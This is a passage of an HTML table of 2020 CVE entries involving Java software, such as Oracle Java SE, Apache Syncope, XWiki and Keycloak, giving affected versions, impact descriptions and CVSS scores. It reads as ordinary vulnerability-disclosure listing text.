		<td valign="top">Vulnerability in the Java SE, Java SE Embedded product of Oracle Java SE (component: Security). Supported versions that are affected are Java SE: 7u241, 8u231, 11.0.5 and 13.0.1; Java SE Embedded: 8u231. Difficult to exploit vulnerability allows unauthenticated attacker with network access via Kerberos to compromise Java SE, Java SE Embedded. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java SE, Java SE Embedded accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.0 Base Score 3.7 (Integrity impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-2585">CVE-2020-2585</a></td>
		<td valign="top">Vulnerability in the Java SE product of Oracle Java SE (component: JavaFX). The supported version that is affected is Java SE: 8u231. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Java SE accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.0 Base Score 5.9 (Integrity impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-2583">CVE-2020-2583</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded product of Oracle Java SE (component: Serialization). Supported versions that are affected are Java SE: 7u241, 8u231, 11.0.5 and 13.0.1; Java SE Embedded: 8u231. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.0 Base Score 3.7 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-2518">CVE-2020-2518</a></td>
		<td valign="top">Vulnerability in the Java VM component of Oracle Database Server. Supported versions that are affected are 11.2.0.4, 12.1.0.2, 12.2.0.1, 18c and 19c. Difficult to exploit vulnerability allows low privileged attacker having Create Session privilege with network access via multiple protocols to compromise Java VM. Successful attacks of this vulnerability can result in takeover of Java VM. CVSS 3.0 Base Score 7.5 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-25023">CVE-2020-25023</a></td>
		<td valign="top">An issue was discovered in Noise-Java through 2020-08-27. AESGCMOnCtrCipherState.encryptWithAd() allows out-of-bounds access.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-25022">CVE-2020-25022</a></td>
		<td valign="top">An issue was discovered in Noise-Java through 2020-08-27. AESGCMFallbackCipherState.encryptWithAd() allows out-of-bounds access.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-25021">CVE-2020-25021</a></td>
		<td valign="top">An issue was discovered in Noise-Java through 2020-08-27. ChaChaPolyCipherState.encryptWithAd() allows out-of-bounds access.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-24786">CVE-2020-24786</a></td>
		<td valign="top">An issue was discovered in Zoho ManageEngine Exchange Reporter Plus before build number 5510, AD360 before build number 4228, ADSelfService Plus before build number 5817, DataSecurity Plus before build number 6033, RecoverManager Plus before build number 6017, EventLog Analyzer before build number 12136, ADAudit Plus before build number 6052, O365 Manager Plus before build number 4334, Cloud Security Plus before build number 4110, ADManager Plus before build number 7055, and Log360 before build number 5166. The remotely accessible Java servlet com.manageengine.ads.fw.servlet.UpdateProductDetails is prone to an authentication bypass. System integration properties can be modified and lead to full ManageEngine suite compromise.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-24639">CVE-2020-24639</a></td>
		<td valign="top">There is a vulnerability caused by unsafe Java deserialization that allows for arbitrary command execution in a containerized environment within Airwave Glass before 1.3.3. Successful exploitation can lead to complete compromise of the underlying host operating system.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-24164">CVE-2020-24164</a></td>
		<td valign="top">A deserialization flaw is present in Taoensso Nippy before 2.14.2. In some circumstances, it is possible for an attacker to create a malicious payload that, when deserialized, will allow arbitrary code to be executed. This occurs because there is automatic use of the Java Serializable interface.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-23621">CVE-2020-23621</a></td>
		<td valign="top">The Java Remote Management Interface of all versions of SVI MS Management System was discovered to contain a vulnerability due to insecure deserialization of user-supplied content, which can allow attackers to execute arbitrary code via a crafted serialized Java object.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-23620">CVE-2020-23620</a></td>
		<td valign="top">The Java Remote Management Interface of all versions of Orlansoft ERP was discovered to contain a vulnerability due to insecure deserialization of user-supplied content, which can allow attackers to execute arbitrary code via a crafted serialized Java object.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-1959">CVE-2020-1959</a></td>
		<td valign="top">A Server-Side Template Injection was identified in Apache Syncope prior to 2.1.6 enabling attackers to inject arbitrary Java EL expressions, leading to an unauthenticated Remote Code Execution (RCE) vulnerability. Apache Syncope uses Java Bean Validation (JSR 380) custom constraint validators. When building custom constraint violation error messages, they support different types of interpolation, including Java EL expressions. Therefore, if an attacker can inject arbitrary data in the error message template being passed, they will be able to run arbitrary Java code.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-1947">CVE-2020-1947</a></td>
		<td valign="top">In Apache ShardingSphere(incubator) 4.0.0-RC3 and 4.0.0, the ShardingSphere's web console uses the SnakeYAML library for parsing YAML inputs to load datasource configuration. SnakeYAML allows to unmarshal data to a Java type By using the YAML tag. Unmarshalling untrusted data can lead to security flaws of RCE.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-1945">CVE-2020-1945</a></td>
		<td valign="top">Apache Ant 1.1 to 1.9.14 and 1.10.0 to 1.10.7 uses the default temporary directory identified by the Java system property java.io.tmpdir for several tasks and may thus leak sensitive information. The fixcrlf and replaceregexp tasks also copy files from the temporary directory back into the build tree allowing an attacker to inject modified source files into the build process.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-19229">CVE-2020-19229</a></td>
		<td valign="top">Jeesite 1.2.7 uses the apache shiro version 1.2.3 affected by CVE-2016-4437. Because of this version of the java deserialization vulnerability, an attacker could exploit the vulnerability to execute arbitrary commands via the rememberMe parameter.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-19138">CVE-2020-19138</a></td>
		<td valign="top">Unrestricted Upload of File with Dangerous Type in DotCMS v5.2.3 and earlier allow remote attackers to execute arbitrary code via the component "/src/main/java/com/dotmarketing/filters/CMSFilter.java".

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-17534">CVE-2020-17534</a></td>
		<td valign="top">There exists a race condition between the deletion of the temporary file and the creation of the temporary directory in `webkit` subproject of HTML/Java API version 1.7. A similar vulnerability has recently been disclosed in other Java projects and the fix in HTML/Java API version 1.7.1 follows theirs: To avoid local privilege escalation version 1.7.1 creates the temporary directory atomically without dealing with the temporary file: https://github.com/apache/netbeans-html4j/commit/fa70e507e5555e1adb4f6518479fc408a7abd0e6

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-17532">CVE-2020-17532</a></td>
		<td valign="top">When handler-router component is enabled in servicecomb-java-chassis, authenticated user may inject some data and cause arbitrary code execution. The problem happens in versions between 2.0.0 ~ 2.1.3 and fixed in Apache ServiceComb-Java-Chassis 2.1.5

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-17531">CVE-2020-17531</a></td>
		<td valign="top">A Java Serialization vulnerability was found in Apache Tapestry 4. Apache Tapestry 4 will attempt to deserialize the "sp" parameter even before invoking the page's validate method, leading to deserialization without authentication. Apache Tapestry 4 reached end of life in 2008 and no update to address this issue will be released. Apache Tapestry 5 versions are not vulnerable to this issue. Users of Apache Tapestry 4 should upgrade to the latest Apache Tapestry 5 version.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-17521">CVE-2020-17521</a></td>
		<td valign="top">Apache Groovy provides extension methods to aid with creating temporary directories. Prior to this fix, Groovy's implementation of those extension methods was using a now superseded Java JDK method call that is potentially not secure on some operating systems in some contexts. Users not using the extension methods mentioned in the advisory are not affected, but may wish to read the advisory for further details. Versions Affected: 2.0 to 2.4.20, 2.5.0 to 2.5.13, 3.0.0 to 3.0.6, and 4.0.0-alpha-1. Fixed in versions 2.4.21, 2.5.14, 3.0.7, 4.0.0-alpha-2.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-17159">CVE-2020-17159</a></td>
		<td valign="top">Visual Studio Code Java Extension Pack Remote Code Execution Vulnerability

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-1714">CVE-2020-1714</a></td>
		<td valign="top">A flaw was found in Keycloak before version 11.0.0, where the code base contains usages of ObjectInputStream without type checks. This flaw allows an attacker to inject arbitrarily serialized Java Objects, which would then get deserialized in a privileged context and potentially lead to remote code execution.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-16971">CVE-2020-16971</a></td>
		<td valign="top">Azure SDK for Java Security Feature Bypass Vulnerability

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-15858">CVE-2020-15858</a></td>
		<td valign="top">Some devices of Thales DIS (formerly Gemalto, formerly Cinterion) allow Directory Traversal by physically proximate attackers. The directory path access check of the internal flash file system can be circumvented. This flash file system can store application-specific data and data needed for customer Java applications, TLS and OTAP (Java over-the-air-provisioning) functionality. The affected products and releases are: BGS5 up to and including SW RN 02.000 / ARN 01.001.06 EHSx and PDSx up to and including SW RN 04.003 / ARN 01.000.04 ELS61 up to and including SW RN 02.002 / ARN 01.000.04 ELS81 up to and including SW RN 05.002 / ARN 01.000.04 PLS62 up to and including SW RN 02.000 / ARN 01.000.04

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-15777">CVE-2020-15777</a></td>
		<td valign="top">An issue was discovered in the Maven Extension plugin before 1.6 for Gradle Enterprise. The extension uses a socket connection to send serialized Java objects. Deserialization is not restricted to an allow-list, thus allowing an attacker to achieve code execution via a malicious deserialization gadget chain. The socket is not bound exclusively to localhost. The port this socket is assigned to is randomly selected and is not intentionally exposed to the public (either by design or documentation). This could potentially be used to achieve remote code execution and local privilege escalation.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-15522">CVE-2020-15522</a></td>
		<td valign="top">Bouncy Castle BC Java before 1.66, BC C# .NET before 1.8.7, BC-FJA before 1.0.1.2, 1.0.2.1, and BC-FNA before 1.0.1.1 have a timing issue within the EC math library that can expose information about the private key when an attacker is able to observe timing information for the generation of multiple deterministic ECDSA signatures.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-15252">CVE-2020-15252</a></td>
		<td valign="top">In XWiki before version 12.5 and 11.10.6, any user with SCRIPT right (EDIT right before XWiki 7.4) can gain access to the application server Servlet context which contains tools allowing to instantiate arbitrary Java objects and invoke methods that may lead to arbitrary code execution. This is patched in XWiki 12.5 and XWiki 11.10.6.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-15250">CVE-2020-15250</a></td>
		<td valign="top">In JUnit4 from version 4.7 and before 4.13.1, the test rule TemporaryFolder contains a local information disclosure vulnerability. On Unix like systems, the system's temporary directory is shared between all users on that system. Because of this, when files and directories are written into this directory they are, by default, readable by other users on that same system. This vulnerability does not allow other users to overwrite the contents of these directories or files. This is purely an information disclosure vulnerability. This vulnerability impacts you if the JUnit tests write sensitive information, like API keys or passwords, into the temporary folder, and the JUnit tests execute in an environment where the OS has other untrusted users. Because certain JDK file system APIs were only added in JDK 1.7, this this fix is dependent upon the version of the JDK you are using. For Java 1.7 and higher users: this vulnerability is fixed in 4.13.1. For Java 1.6 and lower users: no patch is available, you must use the workaround below. If you are unable to patch, or are stuck running on Java 1.6, specifying the `java.io.tmpdir` system environment variable to a directory that is exclusively owned by the executing user will fix this vulnerability. For more information, including an example of vulnerable code, see the referenced GitHub Security Advisory.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-15171">CVE-2020-15171</a></td>
		<td valign="top">In XWiki before versions 11.10.5 or 12.2.1, any user with SCRIPT right (EDIT right before XWiki 7.4) can gain access to the application server Servlet context which contains tools allowing to instantiate arbitrary Java objects and invoke methods that may lead to arbitrary code execution. The only workaround is to give SCRIPT right only to trusted users.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-14803">CVE-2020-14803</a></td>
		<td valign="top">Vulnerability in the Java SE product of Oracle Java SE (component: Libraries). Supported versions that are affected are Java SE: 11.0.8 and 15. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Java SE accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 5.3 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-14798">CVE-2020-14798</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded product of Oracle Java SE (component: Libraries). Supported versions that are affected are Java SE: 7u271, 8u261, 11.0.8 and 15; Java SE Embedded: 8u261. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java SE, Java SE Embedded accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 3.1 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-14797">CVE-2020-14797</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded product of Oracle Java SE (component: Libraries). Supported versions that are affected are Java SE: 7u271, 8u261, 11.0.8 and 15; Java SE Embedded: 8u261. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java SE, Java SE Embedded accessible data. Note: Applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.1 Base Score 3.7 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-14796">CVE-2020-14796</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded product of Oracle Java SE (component: Libraries). Supported versions that are affected are Java SE: 7u271, 8u261, 11.0.8 and 15; Java SE Embedded: 8u261. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Java SE, Java SE Embedded accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 3.1 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-14792">CVE-2020-14792</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded product of Oracle Java SE (component: Hotspot). Supported versions that are affected are Java SE: 7u271, 8u261, 11.0.8 and 15; Java SE Embedded: 8u261. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java SE, Java SE Embedded accessible data as well as unauthorized read access to a subset of Java SE, Java SE Embedded accessible data. Note: Applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.1 Base Score 4.2 (Confidentiality and Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-14782">CVE-2020-14782</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded product of Oracle Java SE (component: Libraries). Supported versions that are affected are Java SE: 7u271, 8u261, 11.0.8 and 15; Java SE Embedded: 8u261. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java SE, Java SE Embedded accessible data. Note: Applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.1 Base Score 3.7 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-14781">CVE-2020-14781</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded product of Oracle Java SE (component: JNDI). Supported versions that are affected are Java SE: 7u271, 8u261, 11.0.8 and 15; Java SE Embedded: 8u261. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Java SE, Java SE Embedded accessible data. Note: Applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.1 Base Score 3.7 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-14779">CVE-2020-14779</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded product of Oracle Java SE (component: Serialization). Supported versions that are affected are Java SE: 7u271, 8u261, 11.0.8 and 15; Java SE Embedded: 8u261. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded. Note: Applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.1 Base Score 3.7 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-14743">CVE-2020-14743</a></td>
		<td valign="top">Vulnerability in the Java VM component of Oracle Database Server. Supported versions that are affected are 11.2.0.4, 12.1.0.2, 12.2.0.1, 18c and 19c. Difficult to exploit vulnerability allows low privileged attacker having Create Procedure privilege with network access via multiple protocols to compromise Java VM. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java VM accessible data. CVSS 3.1 Base Score 3.1 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-14664">CVE-2020-14664</a></td>
		<td valign="top">Vulnerability in the Java SE product of Oracle Java SE (component: JavaFX). The supported version that is affected is Java SE: 8u251. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java SE. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 8.3 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-14621">CVE-2020-14621</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded product of Oracle Java SE (component: JAXP). Supported versions that are affected are Java SE: 7u261, 8u251, 11.0.7 and 14.0.1; Java SE Embedded: 8u251. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java SE, Java SE Embedded accessible data. Note: This vulnerability can only be exploited by supplying data to APIs in the specified Component without using Untrusted Java Web Start applications or Untrusted Java applets, such as through a web service. CVSS 3.1 Base Score 5.3 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-14593">CVE-2020-14593</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded product of Oracle Java SE (component: 2D). Supported versions that are affected are Java SE: 7u261, 8u251, 11.0.7 and 14.0.1; Java SE Embedded: 8u251. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, Java SE Embedded, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Java SE, Java SE Embedded accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 7.4 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:H/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-14583">CVE-2020-14583</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded product of Oracle Java SE (component: Libraries). Supported versions that are affected are Java SE: 7u261, 8u251, 11.0.7 and 14.0.1; Java SE Embedded: 8u251. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, Java SE Embedded, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java SE, Java SE Embedded. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 8.3 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-14581">CVE-2020-14581</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded product of Oracle Java SE (component: 2D). Supported versions that are affected are Java SE: 8u251, 11.0.7 and 14.0.1; Java SE Embedded: 8u251. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Java SE, Java SE Embedded accessible data. Note: Applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.1 Base Score 3.7 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-14579">CVE-2020-14579</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded product of Oracle Java SE (component: Libraries). Supported versions that are affected are Java SE: 7u261 and 8u251; Java SE Embedded: 8u251. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded. Note: Applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.1 Base Score 3.7 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-14578">CVE-2020-14578</a></td>
